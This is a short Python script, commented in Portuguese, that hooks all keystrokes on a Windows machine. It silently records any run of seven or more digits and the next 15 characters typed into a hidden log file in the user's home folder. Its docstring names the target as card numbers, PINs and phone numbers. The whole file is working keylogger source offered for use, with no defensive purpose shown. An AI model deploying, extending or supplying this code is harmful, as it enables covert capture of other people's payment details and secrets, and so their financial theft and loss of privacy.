"""
Monitor de sequencias numericas.

Sempre que 7 ou mais digitos forem digitados em sequencia, grava em um
arquivo de texto os digitos capturados e os proximos 15 caracteres
digitados depois deles (ex.: para ver o que alguem digita logo apos
um numero de telefone, PIN, cartao, etc).

Uso: veja o README.md nesta pasta para instrucoes de instalacao e
execucao (Windows).
"""

import datetime
import os

import keyboard

LOG_FILE = os.path.join(os.path.expanduser("~"), "monitor_numeros.txt")
MIN_DIGITS = 7
FOLLOWUP_CHARS = 15

IGNORED_KEYS = {
    "shift", "ctrl", "alt", "left shift", "right shift", "left ctrl",
    "right ctrl", "left alt", "right alt", "left windows", "right windows",
    "windows", "caps lock", "esc", "menu", "num lock", "scroll lock",
    "print screen", "pause", "insert", "delete", "home", "end",
    "page up", "page down", "up", "down", "left", "right",
    "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
    "backspace",
}

digit_buffer = ""
capture_mode = False
captured_digits = ""
follow_chars = ""


def key_to_char(name):
    if name is None or name in IGNORED_KEYS:
        return None
    if name == "space":
        return " "
    if name == "enter":
        return "\n"
    if name == "tab":
        return "\t"
    if len(name) == 1:
        return name
    return None


def save_log(digits, chars):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] numeros: {digits} | seguido de: {chars!r}\n")


def on_key_event(event):
    global digit_buffer, capture_mode, captured_digits, follow_chars

    if event.event_type != "down":
        return

    ch = key_to_char(event.name)
    if ch is None:
        return

    if capture_mode:
        follow_chars += ch
        if len(follow_chars) >= FOLLOWUP_CHARS:
            save_log(captured_digits, follow_chars)
            capture_mode = False
            captured_digits = ""
            follow_chars = ""
        return

    if ch.isdigit():
        digit_buffer += ch
        if len(digit_buffer) >= MIN_DIGITS:
            captured_digits = digit_buffer
            digit_buffer = ""
            capture_mode = True
            follow_chars = ""
    else:
        digit_buffer = ""


def main():
    keyboard.hook(on_key_event)
    keyboard.wait()


if __name__ == "__main__":
    main()
